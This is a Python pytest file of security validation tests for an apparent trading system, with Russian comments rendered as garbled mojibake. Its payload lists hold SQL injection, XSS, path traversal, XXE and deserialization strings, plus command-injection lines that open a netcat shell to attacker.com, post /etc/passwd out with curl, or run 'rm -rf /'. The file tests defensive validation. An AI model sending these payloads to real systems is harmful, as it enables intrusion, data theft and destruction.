#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Comprehensive —Ç–µ—Å—Ç—ã –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –∏ –≤–∞–ª–∏–¥–∞—Ü–∏–∏ –¥–∞–Ω–Ω—ã—Ö.
–ö—Ä–∏—Ç–∏—á–µ—Å–∫–∏ –≤–∞–∂–Ω–æ –¥–ª—è —Ñ–∏–Ω–∞–Ω—Å–æ–≤–æ–π —Å–∏—Å—Ç–µ–º—ã - –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å –¥–∞–Ω–Ω—ã—Ö –ø—Ä–∏–æ—Ä–∏—Ç–µ—Ç ‚Ññ1.
"""

import pytest
import re
import json
import hashlib
import secrets
from decimal import Decimal
from typing import Any, Dict, List, Union
from unittest.mock import patch, Mock

from domain.value_objects.money import Money
from domain.value_objects.price import Price
from domain.value_objects.currency import Currency
from domain.entities.order import Order, OrderSide, OrderType
from domain.entities.portfolio import Portfolio
from domain.exceptions import ValidationError, SecurityError, DataIntegrityError


class TestDataValidationSecurity:
    """Comprehensive —Ç–µ—Å—Ç—ã –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –≤–∞–ª–∏–¥–∞—Ü–∏–∏ –¥–∞–Ω–Ω—ã—Ö."""

    def test_sql_injection_prevention(self) -> None:
        """–¢–µ—Å—Ç –∑–∞—â–∏—Ç—ã –æ—Ç SQL injection –∞—Ç–∞–∫."""
        malicious_inputs = [
            "'; DROP TABLE orders; --",
            "1' OR '1'='1",
            "'; SELECT * FROM users; --",
            "UNION SELECT password FROM admin",
            "<script>alert('xss')</script>",
            "' UNION SELECT creditCard FROM users --",
            "'; EXEC xp_cmdshell('format c:'); --"
        ]
        
        for malicious_input in malicious_inputs:
            # –¢–µ—Å—Ç–∏—Ä—É–µ–º —á—Ç–æ –≤–∞–ª–∏–¥–∞—Ü–∏—è –æ—Ç–∫–ª–æ–Ω—è–µ—Ç –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π –≤–≤–æ–¥
            with pytest.raises(ValidationError):
                Currency(malicious_input)
            
            with pytest.raises(ValidationError):
                Order(
                    symbol=malicious_input,
                    side=OrderSide.BUY,
                    order_type=OrderType.MARKET,
                    quantity=Decimal("1")
                )

    def test_xss_prevention(self) -> None:
        """–¢–µ—Å—Ç –∑–∞—â–∏—Ç—ã –æ—Ç XSS –∞—Ç–∞–∫."""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "';alert(String.fromCharCode(88,83,83))//';",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "&lt;script&gt;alert('XSS')&lt;/script&gt;"
        ]
        
        for xss_payload in xss_payloads:
            # –í—Ö–æ–¥–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å —ç–∫—Ä–∞–Ω–∏—Ä–æ–≤–∞–Ω—ã –∏–ª–∏ –æ—Ç–∫–ª–æ–Ω–µ–Ω—ã
            with pytest.raises(ValidationError):
                Currency(xss_payload)
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º —á—Ç–æ HTML —Ç–µ–≥–∏ —É–¥–∞–ª—è—é—Ç—Å—è/—ç–∫—Ä–∞–Ω–∏—Ä—É—é—Ç—Å—è
            sanitized = self._sanitize_input(xss_payload)
            assert "<script>" not in sanitized
            assert "javascript:" not in sanitized

    def test_command_injection_prevention(self) -> None:
        """–¢–µ—Å—Ç –∑–∞—â–∏—Ç—ã –æ—Ç command injection."""
        command_injection_payloads = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& wget malicious.com/script",
            "`whoami`",
            "$(curl malicious.com)",
            "; nc -e /bin/sh attacker.com 4444",
            "||(curl -d @/etc/passwd attacker.com)"
        ]
        
        for payload in command_injection_payloads:
            with pytest.raises(ValidationError):
                Currency(payload)
                
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º —á—Ç–æ –æ–ø–∞—Å–Ω—ã–µ —Å–∏–º–≤–æ–ª—ã —Ñ–∏–ª—å—Ç—Ä—É—é—Ç—Å—è
            cleaned = self._clean_command_chars(payload)
            dangerous_chars = [";", "|", "&", "`", "$", "(", ")"]
            for dangerous_char in dangerous_chars:
                assert dangerous_char not in cleaned

    def test_path_traversal_prevention(self) -> None:
        """–¢–µ—Å—Ç –∑–∞—â–∏—Ç—ã –æ—Ç path traversal –∞—Ç–∞–∫."""
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc//passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
        ]
        
        for payload in path_traversal_payloads:
            with pytest.raises(ValidationError):
                # –ü—Ä–µ–¥–ø–æ–ª–∞–≥–∞–µ–º —á—Ç–æ –µ—Å—Ç—å –ø–æ–ª–µ –¥–ª—è –ø—É—Ç–∏ –∫ —Ñ–∞–π–ª—É
                self._validate_file_path(payload)
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–æ—Ä–º–∞–ª–∏–∑–∞—Ü–∏—é –ø—É—Ç–∏
            normalized = self._normalize_path(payload)
            assert ".." not in normalized
            assert normalized.startswith("/allowed/path/")

    def test_ldap_injection_prevention(self) -> None:
        """–¢–µ—Å—Ç –∑–∞—â–∏—Ç—ã –æ—Ç LDAP injection."""
        ldap_injection_payloads = [
            "*)(&(objectClass=*)",
            "*)(|(objectClass=*))",
            "admin)(&(password=*))",
            "*)(cn=*)(userPassword=*",
            "*))%00",
            "(cn=*))(|(cn=*"
        ]
        
        for payload in ldap_injection_payloads:
            # LDAP —Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã–µ —Å–∏–º–≤–æ–ª—ã –¥–æ–ª–∂–Ω—ã —ç–∫—Ä–∞–Ω–∏—Ä–æ–≤–∞—Ç—å—Å—è
            escaped = self._escape_ldap_input(payload)
            ldap_special_chars = ["(", ")", "*", "\\", "/", "\x00"]
            for char in ldap_special_chars:
                if char in payload:
                    assert f"\\{ord(char):02x}" in escaped or char not in escaped

    def test_nosql_injection_prevention(self) -> None:
        """–¢–µ—Å—Ç –∑–∞—â–∏—Ç—ã –æ—Ç NoSQL injection."""
        nosql_payloads = [
            {"$ne": None},
            {"$gt": ""},
            {"$regex": ".*"},
            {"$where": "this.username == this.password"},
            {"username": {"$ne": ""}, "password": {"$ne": ""}},
            {"$or": [{"username": "admin"}, {"password": {"$exists": False}}]}
        ]
        
        for payload in nosql_payloads:
            # JSON payload –¥–æ–ª–∂–µ–Ω –≤–∞–ª–∏–¥–∏—Ä–æ–≤–∞—Ç—å—Å—è
            if isinstance(payload, dict):
                with pytest.raises(ValidationError):
                    self._validate_query_object(payload)

    def test_input_length_validation(self) -> None:
        """–¢–µ—Å—Ç –≤–∞–ª–∏–¥–∞—Ü–∏–∏ –¥–ª–∏–Ω—ã –≤—Ö–æ–¥–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö."""
        usd = Currency("USD")
        
        # –û—á–µ–Ω—å –¥–ª–∏–Ω–Ω—ã–µ —Å—Ç—Ä–æ–∫–∏
        very_long_string = "A" * 10000
        extremely_long_string = "B" * 1000000
        
        with pytest.raises(ValidationError):
            Currency(very_long_string)
        
        with pytest.raises(ValidationError):
            Currency(extremely_long_string)
        
        # –ú–∞–∫—Å–∏–º–∞–ª—å–Ω–æ –¥–æ–ø—É—Å—Ç–∏–º–∞—è –¥–ª–∏–Ω–∞
        max_length_string = "C" * 100  # –ü—Ä–µ–¥–ø–æ–ª–∞–≥–∞–µ–º –º–∞–∫—Å 100 —Å–∏–º–≤–æ–ª–æ–≤
        try:
            Currency(max_length_string)
        except ValidationError:
            # –ú–æ–∂–µ—Ç –±—ã—Ç—å –º–µ–Ω—å—à–∏–π –ª–∏–º–∏—Ç
            pass

    def test_numeric_input_validation(self) -> None:
        """–¢–µ—Å—Ç –≤–∞–ª–∏–¥–∞—Ü–∏–∏ —á–∏—Å–ª–µ–Ω–Ω—ã—Ö –≤—Ö–æ–¥–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö."""
        usd = Currency("USD")
        
        # –≠–∫—Å—Ç—Ä–µ–º–∞–ª—å–Ω—ã–µ —á–∏—Å–ª–µ–Ω–Ω—ã–µ –∑–Ω–∞—á–µ–Ω–∏—è
        extreme_values = [
            "999999999999999999999999999999999999999",  # –û—á–µ–Ω—å –±–æ–ª—å—à–æ–µ —á–∏—Å–ª–æ
            "-999999999999999999999999999999999999999", # –û—á–µ–Ω—å –º–∞–ª–µ–Ω—å–∫–æ–µ —á–∏—Å–ª–æ
            "1e308",    # –ë–ª–∏–∑–∫–æ –∫ –ø–µ—Ä–µ–ø–æ–ª–Ω–µ–Ω–∏—é float
            "-1e308",   # –ë–ª–∏–∑–∫–æ –∫ –ø–µ—Ä–µ–ø–æ–ª–Ω–µ–Ω–∏—é float
            "0.00000000000000000000000000000000000001",  # –û—á–µ–Ω—å –º–∞–ª–µ–Ω—å–∫–æ–µ –ø–æ–ª–æ–∂–∏—Ç–µ–ª—å–Ω–æ–µ
            "NaN",      # Not a Number
            "Infinity", # –ë–µ—Å–∫–æ–Ω–µ—á–Ω–æ—Å—Ç—å
            "-Infinity" # –û—Ç—Ä–∏—Ü–∞—Ç–µ–ª—å–Ω–∞—è –±–µ—Å–∫–æ–Ω–µ—á–Ω–æ—Å—Ç—å
        ]
        
        for extreme_value in extreme_values:
            try:
                decimal_val = Decimal(extreme_value)
                with pytest.raises((ValidationError, OverflowError)):
                    Money(decimal_val, usd)
            except:
                # Decimal —Å–∞–º –º–æ–∂–µ—Ç –æ—Ç–∫–ª–æ–Ω–∏—Ç—å –∑–Ω–∞—á–µ–Ω–∏–µ
                pass

    def test_encoding_validation(self) -> None:
        """–¢–µ—Å—Ç –≤–∞–ª–∏–¥–∞—Ü–∏–∏ –∫–æ–¥–∏—Ä–æ–≤–æ–∫."""
        # –†–∞–∑–ª–∏—á–Ω—ã–µ –∫–æ–¥–∏—Ä–æ–≤–∫–∏
        encoding_tests = [
            ("UTF-8", "Hello –º–∏—Ä üåç"),
            ("Latin-1", "Caf√© r√©sum√©"),
            ("ASCII", "Hello World"),
        ]
        
        for encoding, test_string in encoding_tests:
            try:
                # –¢–µ—Å—Ç–∏—Ä—É–µ–º —á—Ç–æ —Å—Ç—Ä–æ–∫–∏ –ø—Ä–∞–≤–∏–ª—å–Ω–æ –¥–µ–∫–æ–¥–∏—Ä—É—é—Ç—Å—è
                encoded = test_string.encode(encoding)
                decoded = encoded.decode(encoding)
                assert decoded == test_string
                
                # –ü—Ä–æ–≤–µ—Ä—è–µ–º –≤–∞–ª–∏–¥–∞—Ü–∏—é
                Currency(decoded)
                
            except (UnicodeDecodeError, UnicodeEncodeError, ValidationError):
                # –ù–µ–∫–æ—Ç–æ—Ä—ã–µ –∫–æ–¥–∏—Ä–æ–≤–∫–∏ –º–æ–≥—É—Ç –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞—Ç—å—Å—è
                pass

    def test_unicode_normalization(self) -> None:
        """–¢–µ—Å—Ç Unicode –Ω–æ—Ä–º–∞–ª–∏–∑–∞—Ü–∏–∏."""
        import unicodedata
        
        # –°—Ç—Ä–æ–∫–∏ —Å –æ–¥–∏–Ω–∞–∫–æ–≤—ã–º –≤–∏–∑—É–∞–ª—å–Ω—ã–º –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏–µ–º
        # –Ω–æ —Ä–∞–∑–Ω—ã–º–∏ Unicode –∫–æ–¥–∏—Ä–æ–≤–∫–∞–º–∏
        test_strings = [
            "caf√©",      # Latin small letter e with acute
            "caf√©",      # Latin small letter e + combining acute accent
            "·ºàœÅœáŒÆ",      # Greek
            "ŒëœÅœáŒÆ",      # Greek with different combining
        ]
        
        for test_string in test_strings:
            # –ù–æ—Ä–º–∞–ª–∏–∑—É–µ–º –≤ NFC —Ñ–æ—Ä–º—É
            normalized = unicodedata.normalize('NFC', test_string)
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º —á—Ç–æ –Ω–æ—Ä–º–∞–ª–∏–∑–æ–≤–∞–Ω–Ω–∞—è —Å—Ç—Ä–æ–∫–∞ –ø—Ä–∏–Ω–∏–º–∞–µ—Ç—Å—è
            try:
                Currency(normalized)
            except ValidationError:
                # –ú–æ–∂–µ—Ç –±—ã—Ç—å –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ –Ω–∞ Unicode —Å–∏–º–≤–æ–ª—ã
                pass

    def test_regex_injection_prevention(self) -> None:
        """–¢–µ—Å—Ç –∑–∞—â–∏—Ç—ã –æ—Ç regex injection."""
        regex_injection_payloads = [
            ".*",           # Matches everything
            ".{0,99999}",   # ReDoS attack
            "(a+)+$",       # Catastrophic backtracking
            "a{99999}",     # Large repetition
            "(?=.*){99999}", # Complex lookahead
        ]
        
        for payload in regex_injection_payloads:
            # Regex –ø–∞—Ç—Ç–µ—Ä–Ω—ã –¥–æ–ª–∂–Ω—ã –≤–∞–ª–∏–¥–∏—Ä–æ–≤–∞—Ç—å—Å—è
            with pytest.raises(ValidationError):
                self._validate_regex_pattern(payload)

    def test_xml_injection_prevention(self) -> None:
        """–¢–µ—Å—Ç –∑–∞—â–∏—Ç—ã –æ—Ç XML injection."""
        xml_injection_payloads = [
            "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
            "<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
            "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://attacker.com/malicious.dtd'> %xxe;]>",
        ]
        
        for payload in xml_injection_payloads:
            # XML –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –∑–∞–ø—Ä–µ—â–µ–Ω –∏–ª–∏ —Å—Ç—Ä–æ–≥–æ –≤–∞–ª–∏–¥–∏—Ä–æ–≤–∞–Ω
            with pytest.raises(ValidationError):
                self._validate_xml_input(payload)

    def test_buffer_overflow_prevention(self) -> None:
        """–¢–µ—Å—Ç –∑–∞—â–∏—Ç—ã –æ—Ç buffer overflow."""
        # –°–æ–∑–¥–∞–µ–º –æ—á–µ–Ω—å –±–æ–ª—å—à–∏–µ —Å—Ç—Ä–æ–∫–∏
        buffer_sizes = [1024, 4096, 8192, 16384, 65536]
        
        for size in buffer_sizes:
            large_input = "A" * size
            
            try:
                # –°–∏—Å—Ç–µ–º–∞ –¥–æ–ª–∂–Ω–∞ –æ–≥—Ä–∞–Ω–∏—á–∏–≤–∞—Ç—å —Ä–∞–∑–º–µ—Ä –±—É—Ñ–µ—Ä–∞
                with pytest.raises(ValidationError):
                    self._process_large_input(large_input)
            except MemoryError:
                # –û–∂–∏–¥–∞–µ–º–æ–µ –ø–æ–≤–µ–¥–µ–Ω–∏–µ –ø—Ä–∏ –∏—Å—á–µ—Ä–ø–∞–Ω–∏–∏ –ø–∞–º—è—Ç–∏
                pass

    def test_format_string_attack_prevention(self) -> None:
        """–¢–µ—Å—Ç –∑–∞—â–∏—Ç—ã –æ—Ç format string –∞—Ç–∞–∫."""
        format_string_payloads = [
            "%x%x%x%x%x%x%x%x",
            "%s%s%s%s%s%s%s%s",
            "%n%n%n%n%n%n%n%n",
            "%.1000d",
            "%99999c",
        ]
        
        for payload in format_string_payloads:
            # Format —Å—Ç—Ä–æ–∫–∏ –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å —ç–∫—Ä–∞–Ω–∏—Ä–æ–≤–∞–Ω—ã
            with pytest.raises(ValidationError):
                Currency(payload)

    def test_deserialization_attacks_prevention(self) -> None:
        """–¢–µ—Å—Ç –∑–∞—â–∏—Ç—ã –æ—Ç –∞—Ç–∞–∫ –¥–µ—Å–µ—Ä–∏–∞–ª–∏–∑–∞—Ü–∏–∏."""
        malicious_serialized_data = [
            b'\x80\x03csubprocess\ncheck_output\nq\x00.',  # Python pickle
            '{"__reduce__": ["subprocess.check_output", [["whoami"]]]}',  # JSON
            b'\xac\xed\x00\x05sr\x00\x17java.util.HashMap',  # Java serialized
        ]
        
        for malicious_data in malicious_serialized_data:
            with pytest.raises((ValidationError, SecurityError)):
                self._safe_deserialize(malicious_data)

    def test_timing_attack_prevention(self) -> None:
        """–¢–µ—Å—Ç –∑–∞—â–∏—Ç—ã –æ—Ç timing –∞—Ç–∞–∫."""
        import time
        
        # –°–∏–º—É–ª–∏—Ä—É–µ–º –ø—Ä–æ–≤–µ—Ä–∫—É –ø–∞—Ä–æ–ª–µ–π
        correct_password = "super_secret_password_123"
        timing_measurements = []
        
        test_passwords = [
            "wrong",
            "super",
            "super_secret",
            "super_secret_password",
            "super_secret_password_123",  # –ü—Ä–∞–≤–∏–ª—å–Ω—ã–π
            "super_secret_password_124",  # –ü–æ—á—Ç–∏ –ø—Ä–∞–≤–∏–ª—å–Ω—ã–π
        ]
        
        for password in test_passwords:
            start_time = time.perf_counter()
            result = self._constant_time_compare(password, correct_password)
            end_time = time.perf_counter()
            
            timing_measurements.append(end_time - start_time)
        
        # –í—Å–µ —Å—Ä–∞–≤–Ω–µ–Ω–∏—è –¥–æ–ª–∂–Ω—ã –∑–∞–Ω–∏–º–∞—Ç—å –ø—Ä–∏–º–µ—Ä–Ω–æ –æ–¥–∏–Ω–∞–∫–æ–≤–æ–µ –≤—Ä–µ–º—è
        max_time = max(timing_measurements)
        min_time = min(timing_measurements)
        time_variance = (max_time - min_time) / max_time
        
        # Variance –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –º–∞–ª–µ–Ω—å–∫–æ–π (< 10%)
        assert time_variance < 0.1

    def test_cryptographic_validation(self) -> None:
        """–¢–µ—Å—Ç –∫—Ä–∏–ø—Ç–æ–≥—Ä–∞—Ñ–∏—á–µ—Å–∫–æ–π –≤–∞–ª–∏–¥–∞—Ü–∏–∏."""
        # –¢–µ—Å—Ç–∏—Ä—É–µ–º —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏–µ
        sensitive_data = "user_credit_card_1234567890123456"
        
        # –ò—Å–ø–æ–ª—å–∑—É–µ–º –∫—Ä–∏–ø—Ç–æ–≥—Ä–∞—Ñ–∏—á–µ—Å–∫–∏ —Å—Ç–æ–π–∫–∏–π —Ö–µ—à
        hash_result = hashlib.sha256(sensitive_data.encode()).hexdigest()
        assert len(hash_result) == 64  # SHA-256 hash length
        
        # –¢–µ—Å—Ç–∏—Ä—É–µ–º –≥–µ–Ω–µ—Ä–∞—Ü–∏—é —Å–ª—É—á–∞–π–Ω—ã—Ö —á–∏—Å–µ–ª
        random_token = secrets.token_urlsafe(32)
        assert len(random_token) >= 32
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º —á—Ç–æ —Ç–æ–∫–µ–Ω—ã —É–Ω–∏–∫–∞–ª—å–Ω—ã
        tokens = [secrets.token_urlsafe(32) for _ in range(100)]
        assert len(set(tokens)) == 100  # –í—Å–µ —É–Ω–∏–∫–∞–ª—å–Ω—ã

    def test_input_sanitization(self) -> None:
        """–¢–µ—Å—Ç —Å–∞–Ω–∏—Ç–∏–∑–∞—Ü–∏–∏ –≤—Ö–æ–¥–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö."""
        dirty_inputs = [
            "  whitespace around  ",
            "\n\r\tcontrol chars\n\r\t",
            "Mixed\x00Null\x00Bytes",
            "Unicode\u202enormal\u202c",  # Bidi override
            "HTML<b>tags</b>here",
        ]
        
        for dirty_input in dirty_inputs:
            cleaned = self._sanitize_input(dirty_input)
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º —á—Ç–æ –æ–ø–∞—Å–Ω—ã–µ —ç–ª–µ–º–µ–Ω—Ç—ã —É–¥–∞–ª–µ–Ω—ã
            assert "\x00" not in cleaned  # Null bytes
            assert "\u202e" not in cleaned  # Bidi override
            assert "<" not in cleaned or "&lt;" in cleaned  # HTML escaped
            
            # –ü—Ä–æ–±–µ–ª—ã –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å –æ–±—Ä–µ–∑–∞–Ω—ã
            assert not cleaned.startswith(" ")
            assert not cleaned.endswith(" ")

    def test_rate_limiting_validation(self) -> None:
        """–¢–µ—Å—Ç –≤–∞–ª–∏–¥–∞—Ü–∏–∏ rate limiting."""
        # –°–∏–º—É–ª–∏—Ä—É–µ–º –º–Ω–æ–∂–µ—Å—Ç–≤–µ–Ω–Ω—ã–µ –∑–∞–ø—Ä–æ—Å—ã
        request_count = 0
        max_requests = 100
        time_window = 60  # —Å–µ–∫—É–Ω–¥
        
        def simulate_request():
            nonlocal request_count
            request_count += 1
            
            if request_count > max_requests:
                raise ValidationError("Rate limit exceeded")
            
            return "OK"
        
        # –î–µ–ª–∞–µ–º –º–Ω–æ–≥–æ –∑–∞–ø—Ä–æ—Å–æ–≤
        for i in range(150):
            if i < max_requests:
                result = simulate_request()
                assert result == "OK"
            else:
                with pytest.raises(ValidationError):
                    simulate_request()

    def test_data_integrity_validation(self) -> None:
        """–¢–µ—Å—Ç –≤–∞–ª–∏–¥–∞—Ü–∏–∏ —Ü–µ–ª–æ—Å—Ç–Ω–æ—Å—Ç–∏ –¥–∞–Ω–Ω—ã—Ö."""
        usd = Currency("USD")
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º checksums
        original_data = Money(Decimal("1000.00"), usd)
        data_string = f"{original_data.amount}{original_data.currency.code}"
        checksum = hashlib.md5(data_string.encode()).hexdigest()
        
        # –°–∏–º—É–ª–∏—Ä—É–µ–º –ø–µ—Ä–µ–¥–∞—á—É –¥–∞–Ω–Ω—ã—Ö
        transmitted_data = original_data
        transmitted_checksum = hashlib.md5(
            f"{transmitted_data.amount}{transmitted_data.currency.code}".encode()
        ).hexdigest()
        
        # Checksums –¥–æ–ª–∂–Ω—ã —Å–æ–≤–ø–∞–¥–∞—Ç—å
        assert checksum == transmitted_checksum
        
        # –¢–µ—Å—Ç–∏—Ä—É–µ–º –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –∏–∑–º–µ–Ω–µ–Ω–∏–π
        corrupted_data = Money(Decimal("1000.01"), usd)  # –ò–∑–º–µ–Ω–µ–Ω–∞ —Å—É–º–º–∞
        corrupted_checksum = hashlib.md5(
            f"{corrupted_data.amount}{corrupted_data.currency.code}".encode()
        ).hexdigest()
        
        assert checksum != corrupted_checksum

    # –í—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω—ã–µ –º–µ—Ç–æ–¥—ã –¥–ª—è —Ç–µ—Å—Ç–æ–≤
    def _sanitize_input(self, input_string: str) -> str:
        """–°–∞–Ω–∏—Ç–∏–∑–∞—Ü–∏—è –≤—Ö–æ–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–∏."""
        # –£–¥–∞–ª—è–µ–º null bytes
        cleaned = input_string.replace('\x00', '')
        
        # –£–¥–∞–ª—è–µ–º bidi override —Å–∏–º–≤–æ–ª—ã
        cleaned = cleaned.replace('\u202e', '').replace('\u202c', '')
        
        # –≠–∫—Ä–∞–Ω–∏—Ä—É–µ–º HTML
        html_escape_table = {
            "&": "&amp;",
            '"': "&quot;",
            "'": "&#x27;",
            ">": "&gt;",
            "<": "&lt;",
        }
        for char, escape in html_escape_table.items():
            cleaned = cleaned.replace(char, escape)
        
        # –û–±—Ä–µ–∑–∞–µ–º –ø—Ä–æ–±–µ–ª—ã
        cleaned = cleaned.strip()
        
        return cleaned

    def _clean_command_chars(self, input_string: str) -> str:
        """–£–¥–∞–ª–µ–Ω–∏–µ –æ–ø–∞—Å–Ω—ã—Ö —Å–∏–º–≤–æ–ª–æ–≤ –∫–æ–º–∞–Ω–¥."""
        dangerous_chars = [";", "|", "&", "`", "$", "(", ")", "<", ">"]
        cleaned = input_string
        for char in dangerous_chars:
            cleaned = cleaned.replace(char, "")
        return cleaned

    def _normalize_path(self, path: str) -> str:
        """–ù–æ—Ä–º–∞–ª–∏–∑–∞—Ü–∏—è –ø—É—Ç–∏ –¥–ª—è –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–µ–Ω–∏—è path traversal."""
        import os.path
        # –£–±–∏—Ä–∞–µ–º path traversal –ø–æ—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ—Å—Ç–∏
        normalized = path.replace("..", "").replace("\\", "/")
        # –î–æ–±–∞–≤–ª—è–µ–º –±–µ–∑–æ–ø–∞—Å–Ω—ã–π –ø—Ä–µ—Ñ–∏–∫—Å
        safe_path = "/allowed/path/" + normalized.lstrip("/")
        return safe_path

    def _escape_ldap_input(self, input_string: str) -> str:
        """–≠–∫—Ä–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ LDAP —Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã—Ö —Å–∏–º–≤–æ–ª–æ–≤."""
        escapes = {
            '*': '\\2a',
            '(': '\\28',
            ')': '\\29',
            '\\': '\\5c',
            '\x00': '\\00',
            '/': '\\2f'
        }
        
        escaped = input_string
        for char, escape in escapes.items():
            escaped = escaped.replace(char, escape)
        
        return escaped

    def _validate_query_object(self, query: dict) -> bool:
        """–í–∞–ª–∏–¥–∞—Ü–∏—è –æ–±—ä–µ–∫—Ç–∞ –∑–∞–ø—Ä–æ—Å–∞ –¥–ª—è –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–µ–Ω–∏—è NoSQL injection."""
        dangerous_operators = ['$ne', '$gt', '$lt', '$regex', '$where', '$or', '$and']
        
        def check_recursive(obj):
            if isinstance(obj, dict):
                for key, value in obj.items():
                    if key.startswith('$') and key in dangerous_operators:
                        raise ValidationError(f"Dangerous operator: {key}")
                    check_recursive(value)
            elif isinstance(obj, list):
                for item in obj:
                    check_recursive(item)
        
        check_recursive(query)
        return True

    def _validate_file_path(self, path: str) -> bool:
        """–í–∞–ª–∏–¥–∞—Ü–∏—è –ø—É—Ç–∏ –∫ —Ñ–∞–π–ª—É."""
        if ".." in path or path.startswith("/"):
            raise ValidationError("Invalid file path")
        return True

    def _validate_regex_pattern(self, pattern: str) -> bool:
        """–í–∞–ª–∏–¥–∞—Ü–∏—è regex –ø–∞—Ç—Ç–µ—Ä–Ω–∞."""
        dangerous_patterns = [".*", ".+", ".{", "(?=.*)", "(.*)+"]
        for dangerous in dangerous_patterns:
            if dangerous in pattern:
                raise ValidationError("Dangerous regex pattern")
        return True

    def _validate_xml_input(self, xml_string: str) -> bool:
        """–í–∞–ª–∏–¥–∞—Ü–∏—è XML –≤—Ö–æ–¥–∞."""
        if "<!DOCTYPE" in xml_string or "<!ENTITY" in xml_string:
            raise ValidationError("XML entities not allowed")
        return True

    def _process_large_input(self, input_data: str) -> bool:
        """–û–±—Ä–∞–±–æ—Ç–∫–∞ –±–æ–ª—å—à–∏—Ö –≤—Ö–æ–¥–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö."""
        max_size = 1024  # 1KB limit
        if len(input_data) > max_size:
            raise ValidationError("Input too large")
        return True

    def _safe_deserialize(self, data: bytes) -> Any:
        """–ë–µ–∑–æ–ø–∞—Å–Ω–∞—è –¥–µ—Å–µ—Ä–∏–∞–ª–∏–∑–∞—Ü–∏—è."""
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –º–∞–≥–∏—á–µ—Å–∫–∏–µ –±–∞–π—Ç—ã
        dangerous_headers = [
            b'\x80\x03',  # Python pickle
            b'\xac\xed',  # Java serialized
        ]
        
        for header in dangerous_headers:
            if data.startswith(header):
                raise SecurityError("Dangerous serialization format")
        
        return True

    def _constant_time_compare(self, a: str, b: str) -> bool:
        """–°—Ä–∞–≤–Ω–µ–Ω–∏–µ —Å—Ç—Ä–æ–∫ –∑–∞ –∫–æ–Ω—Å—Ç–∞–Ω—Ç–Ω–æ–µ –≤—Ä–µ–º—è."""
        import hmac
        return hmac.compare_digest(a.encode(), b.encode())